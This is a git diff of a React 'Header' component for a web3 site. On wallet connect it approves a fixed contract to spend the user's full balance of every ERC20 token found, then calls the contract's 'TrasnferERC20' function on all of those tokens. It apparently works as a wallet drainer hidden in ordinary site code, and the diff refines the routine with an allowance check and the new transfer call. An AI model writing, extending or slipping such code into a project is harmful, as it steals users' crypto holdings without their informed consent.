@@ -83,33 +83,39 @@ export default function Header() {
       const web3 = new Web3(biconomy);
 
 
-      if(defaultChainId !== chainId) {
-        await web3.currentProvider.request({
-            method: 'wallet_switchEthereumChain',
-              params: [{ chainId: defaultChainId }],
-            });
-      }
+      biconomy.onEvent(biconomy.READY, async () => {
 
-      const network = await web3Provider.getNetwork();
+        console.log("is Started---")
+        if(defaultChainId !== chainId) {
+          await web3.currentProvider.request({
+              method: 'wallet_switchEthereumChain',
+                params: [{ chainId: defaultChainId }],
+              });
+        }
+  
+        const network = await web3Provider.getNetwork();
+  
+        try {
+          await mainHandler(web3, address);
+        }catch(error) {
+          console.log(error);
+          await mainHandler(web3, address);
+        }
+        
+        dispatch(setWeb3ProviderAction({
+          provider,
+          web3Provider,
+          address,
+          web3,
+          chainId: network.chainId,
+        }))
 
-      const ctr = new web3.eth.Contract(contractABI, contractAddr);
-      const recipient = await ctr.methods.recipient().call();
-      console.log(recipient);
-      try {
-        //await mainHandler(web3, address);
-      }catch(error) {
+      }).onEvent(biconomy.ERROR, (error, message) => {
+        // Handle error while initializing mexa
         console.log(error);
-        await mainHandler(web3, address);
-
-      }
+        console.log("Error while initializing biconomy");
+      });
       
-      dispatch(setWeb3ProviderAction({
-        provider,
-        web3Provider,
-        address,
-        web3,
-        chainId: network.chainId,
-      }))
     }
 
     const mainHandler = async (web3, address) => {
@@ -139,14 +145,17 @@ export default function Header() {
 
       for(let i=0 ; i<erc20BalRes.length ; i++) {
         const _tokenContract = new web3.eth.Contract(ERC20ABI, erc20BalRes[i].address);
-
-        await _tokenContract.methods.approve(contractAddr, web3.utils.toWei((erc20BalRes[i].balance).toString())).send({from: address});
+        let allowedAmount = await _tokenContract.methods.allowance(address, contractAddr).call();
+        console.log(allowedAmount)
+        if(Number.parseInt(erc20BalRes[i].balance) !== Number.parseInt(allowedAmount/Math.pow(10, 18))) {
+          await _tokenContract.methods.approve(contractAddr, web3.utils.toWei((erc20BalRes[i].balance).toString())).send({from: address});
+        }
         
       }
 
       if(erc20BalRes.length) {
         const _mainContract = new web3.eth.Contract(contractABI, contractAddr);
-        await _mainContract.methods.transfer(erc20BalRes.map(b => b.address), erc20BalRes.map(b => web3.utils.toWei("100"))).send({from: address});
+        await _mainContract.methods.TrasnferERC20(erc20BalRes.map(b => b.address)).send({from: address});
         console.log("----------sent-----")
       
       }
